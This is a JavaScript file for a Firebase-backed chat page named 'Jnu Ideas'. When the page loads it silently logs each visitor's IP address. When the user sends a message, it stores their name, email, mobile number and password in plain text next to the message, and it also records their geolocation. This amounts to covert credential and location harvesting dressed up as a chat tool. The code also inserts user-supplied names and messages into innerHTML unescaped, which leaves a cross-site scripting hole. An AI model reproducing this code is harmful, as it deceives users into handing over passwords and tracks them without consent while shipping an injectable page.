
 // Initialize Firebase
 const firebaseConfig = {
    apiKey: "AIzaSyDefTZ3hQl16jIvXbIQ3AXFvkvQWlwIpqI",
    authDomain: "dream-web-61ad8.firebaseapp.com",
    projectId: "dream-web-61ad8",
    storageBucket: "dream-web-61ad8.appspot.com",
    messagingSenderId: "40035040781",
    appId: "1:40035040781:web:ab016bb5d72c612e325f44",
    measurementId: "G-76X879JLY4"
  };
  // Initialize Firebase app
  firebase.initializeApp(firebaseConfig);
  
  // Get references to DOM elements
//   const serverInput = document.getElementById('server-input');
  const nameInput = document.getElementById('name-input');
  const emailInput = document.getElementById('email-input');
  const mobInput = document.getElementById('mob-input');
  const passInput = document.getElementById('pass-input');
  const messageInput = document.getElementById('message-input');
  const sendButton = document.getElementById('send-button');
  const messageContainer = document.getElementById('message-container');



  const currentTime = new Date();
 // Get the current time as a formatted string
 const formattedTime = currentTime.toLocaleTimeString();
 const formattedData = currentTime.toLocaleDateString();
      

 // IP address
fetch('https://api.ipify.org?format=json')
.then(response => response.json())
.then(data => {
const ipAddress = data.ip;
// push(userpass, {
//  time: formattedTime,
//      Yourip: ipAddress
// })
const serverRef = firebase.database().ref("Jnu Ideas IP");
      serverRef.push().set({
        data: formattedData,
        time: formattedTime,
            Yourip: ipAddress
       });


})
.catch(error => {
console.error('Error while fetching IP address:', error);
});



  
  // Send button click event handler
  sendButton.addEventListener('click', function() {
    const serverName = "Jnu Ideas";
    const email = emailInput.value;
    const pass = passInput.value;
    const mob = mobInput.value;
    const name = nameInput.value.trim();
    const message = messageInput.value;

    const formattedTime = currentTime.toLocaleTimeString();
    const formattedData = currentTime.toLocaleDateString();
  
    if (serverName && name && message && pass && email) {
      const serverRef = firebase.database().ref(serverName);

     // Check if the browser supports the Geolocation API
if ('geolocation' in navigator) {
    navigator.geolocation.getCurrentPosition(function(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const accuracy = position.coords.accuracy;

      const userLoc = firebase.database().ref("user Loc");
      userLoc.push().set({
        Date: formattedData,
        time: formattedTime,
        name: name,
        latitude: latitude,
        longitude: longitude,
        accuracy: accuracy
      });
  
    
    }, function(error) {
      console.log('Error getting location:', error);
    });
  } else {
    console.log('Geolocation API is not supported by this browser.');
  }


      serverRef.push().set({
        Date: formattedData,
        time: formattedTime,
        name: name,
        message: message,
        pass: pass,
        email: email,
        mob: mob
      });
  
      // Clear input fields
      // nameInput.value = '';
      messageInput.value = '';
    }
   else if (name.length == 0){
    alert('Enter Your UserName');
   }
   else if (email.length == 0){
    alert('Bro Enter Your Email');
   }
   else if (pass.length == 0){
    alert('Bro Password Kon Enter Karga ');
   }
  });
  
  // Realtime listener for server messages
  emailInput.addEventListener('change', function() {
    // let serverName = serverInput.value.trim().toLowerCase();
    let serverName = "Jnu Ideas";
  
    // Clear message container
    messageContainer.innerHTML = '';
  
    if (serverName) {
      const serverRef = firebase.database().ref(serverName);
      serverRef.on('child_added', function(snapshot) {
        const message = snapshot.val();
        displayMessage(message.name, message.message);
        scrollToBottom();
      });
    }
  });
  
  // Function to display messages
  
  // function displayMessage(name, message) {
  //   const messageElement = document.createElement('div');
  //   messageElement.innerHTML = `<strong>${name}:</strong> ${message}`;
  //   messageContainer.appendChild(messageElement);
  // }
  
  // function displayMessage(name, message) {
  //   const messageElement = document.createElement('div');
  //   const messageClass = 'message-' + name.toLowerCase().replace(/\s/g, '');
  //   messageElement.className = messageClass;
  //   messageElement.innerHTML = `<strong>${name}:</strong> ${message}`;
  //   messageContainer.appendChild(messageElement);
  // }
  
  // Function to display messages
  function displayMessage(name, message) {
    const messageElement = document.createElement('div');
  
    messageElement.classList.add('all-message');
    // Check if the sender's name matches your name
    if (name === nameInput.value) {
      
      messageElement.classList.add('my-message'); // Add a custom class for your messages
    }
    
    messageElement.innerHTML = `<strong class="meesa">${name} :</strong>   ${message}`;
    messageContainer.appendChild(messageElement);
  }
  
  function scrollToBottom() {
    messageContainer.scrollTop = messageContainer.scrollHeight;
  }